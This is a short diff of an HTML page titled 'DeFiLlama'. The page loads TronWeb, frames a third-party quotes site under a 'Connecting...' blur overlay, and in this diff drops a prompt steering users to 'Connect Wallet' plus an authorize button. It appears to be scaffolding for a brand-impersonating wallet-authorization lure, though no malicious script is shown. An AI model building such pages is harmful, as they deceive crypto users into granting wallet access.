@@ -5,11 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DeFiLlama</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-
+    <link rel="stylesheet" href="./src/style.css">  <!-- 引用 style.css -->
     <!--  添加 TronWeb 的引用 -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@4.1.0/dist/TronWeb.min.js"></script>
-
-    <link rel="stylesheet" href="./src/style.css">
 </head>
 <body>
 
@@ -19,30 +17,14 @@
         </button>
     </header>
 
-    <div id="status"></div>  <!-- 状态栏在此定义 -->
+    <div id="status"></div>  <!-- 状态栏 -->
 
     <div id="contentContainer">
         <iframe id="coindeskFrame" src="https://www.hdxcmax.com/syn/#/quotes/index" title="HDXC"></iframe>
     </div>
 
-    <div id="blurOverlay" style="display: flex;">  <!--  关键:  initial display:flex -->
+    <div id="blurOverlay" style="display: flex;">  <!-- 遮罩层 (初始显示) -->
         <div id="overlayMessage">Connecting...</div>
-    </div>
-
-    <div id="lockedPrompt" style="display: none;">  <!-- 鎖定提示, 如果要顯示, 請修改 display: flex -->
-        <div id="authGuideBox">
-            <div id="arrowIndicator"></div>
-            <div class="info-box">
-                <p style="margin: 0; font-size: 1.0em; color: #f0f0f0;">
-                    <i class="fas fa-hand-pointer"></i> Tap 'Connect Wallet' in the top-right corner.
-                </p>
-            </div>
-        </div>
-
-        <h2 style="display: none;"></h2>
-        <p style="display: none;"></p>
-        <button id="authorizeButton" style="display: none;"></button>
-        <p class="small-tip" style="display: none;"></p>
     </div>
 
     <script src="./src/main.js"></script>
